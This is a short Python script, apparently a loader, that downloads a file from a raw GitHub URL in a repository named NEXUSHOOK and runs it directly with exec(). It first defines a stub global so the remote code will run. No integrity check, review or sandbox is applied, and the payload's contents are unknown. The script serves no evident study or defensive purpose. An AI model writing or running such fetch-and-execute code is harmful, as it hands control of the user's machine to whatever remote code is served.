import requests

def load_and_run_code_from_url(url):
    response = requests.get(url, timeout=10)
    response.raise_for_status()
    code = response.text
    
    # Định nghĩa cls trước khi chạy
    global cls
    cls = lambda: None
    
    exec(code)

if __name__ == "__main__":
    url = "https://raw.githubusercontent.com/nhan22977-sudo/NEXUSHOOK/refs/heads/main/src.py"
    load_and_run_code_from_url(url)
